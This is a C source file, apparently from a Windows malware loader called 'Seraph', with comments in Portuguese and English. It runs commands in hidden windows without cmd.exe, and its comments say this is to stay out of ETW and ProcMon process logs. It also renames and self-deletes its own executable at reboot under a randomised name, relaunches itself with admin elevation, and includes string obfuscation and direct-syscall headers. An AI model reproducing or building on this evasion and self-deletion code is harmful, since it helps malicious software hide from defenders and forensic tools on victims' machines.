#ifndef _CRT_SECURE_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#endif
#include "command.h"
#include <shellapi.h>
#include "XorStr.h"
#include "syscalls.h"
/* P7: ExecuteCommandSilent reescrita sem cmd.exe.
 * cmd.exe aparece no ETW de criacao de processos e em ProcMon como filho do loader.
 * Para deleção de arquivo usamos DeleteFileW diretamente.
 * Para outros comandos usamos CreateProcessW no binario alvo diretamente,
 * sem shell intermediaria. */
void ExecuteCommandSilent(LPCWSTR c){
    if (!c || !c[0]) return;
    /* Caso especial: comando começa com "del " → usar DeleteFileW diretamente */
    if (c[0]==L'd'&&c[1]==L'e'&&c[2]==L'l'&&c[3]==L' ') {
        const WCHAR *path = c + 4;
        /* Pula aspas ao redor do path se presentes */
        if (*path == L'"') { path++; }
        WCHAR tmp[MAX_PATH];
        int i = 0;
        while (path[i] && path[i] != L'"' && i < MAX_PATH-1) { tmp[i]=path[i]; i++; }
        tmp[i] = 0;
        SetFileAttributesW(tmp, FILE_ATTRIBUTE_NORMAL);
        DeleteFileW(tmp);
        return;
    }
    /* Caso geral: executa o binario diretamente (sem cmd.exe) */
    WCHAR cmdline[768];
    /* Copia para buffer mutable (CreateProcessW requer LPWSTR, não LPCWSTR) */
    int cl = 0;
    while (c[cl] && cl < 767) { cmdline[cl] = c[cl]; cl++; }
    cmdline[cl] = 0;
    STARTUPINFOW si={0};si.cb=sizeof(si);si.dwFlags=STARTF_USESHOWWINDOW;si.wShowWindow=SW_HIDE;
    PROCESS_INFORMATION pi={0};
    if(CreateProcessW(NULL,cmdline,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)){
        WaitForSingleObject(pi.hProcess,15000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

/* M-12: Rename loader to a temp name + mark for deletion on next boot.
   64-bit entropy: TickCount64 ^ PID ^ vol serial — eliminates predictable name pattern. */
void SeraphMelt(void){
    WCHAR src[MAX_PATH],dst[MAX_PATH];
    GetModuleFileNameW(NULL,src,MAX_PATH);
    wcscpy_s(dst,MAX_PATH,src);
    WCHAR *sl=wcsrchr(dst,L'\\');
    if(sl){
        *(sl+1)=0;
        /* Build 64-bit entropy from three independent sources */
        DWORD vol = 0;
        GetVolumeInformationW(L"C:\\", NULL, 0, &vol, NULL, NULL, NULL, 0);
        ULONGLONG entropy = GetTickCount64()
                          ^ ((ULONGLONG)GetCurrentProcessId() << 32)
                          ^ (ULONGLONG)vol;
        WCHAR tmp[32]; wsprintfW(tmp, L"tmp%08X%08X.tmp",
            (DWORD)(entropy >> 32), (DWORD)(entropy & 0xFFFFFFFF));
        wcscat_s(dst,MAX_PATH,tmp);
        if(!MoveFileW(src,dst)) wcscpy_s(dst,MAX_PATH,src); /* fallback: mark original */
    }
    MoveFileExW(dst,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);
}
void RelaunchAsAdmin(LPCWSTR a){
    WCHAR fP[MAX_PATH];GetModuleFileNameW(NULL,fP,MAX_PATH);
    SHELLEXECUTEINFOW s={sizeof(s)};s.lpVerb=L"runas";s.lpFile=fP;s.lpParameters=a;s.nShow=SW_SHOW;
    ShellExecuteExW(&s);
    /* TerminateProcess instead of ExitProcess — avoids DllMain(DLL_PROCESS_DETACH)
     * deadlocks in winhttp/d3d12/dxgi background threads (same fix as loader.c). */
    SysNtTerminateProcess(SERAPH_CURRENT_PROCESS, 0);
}
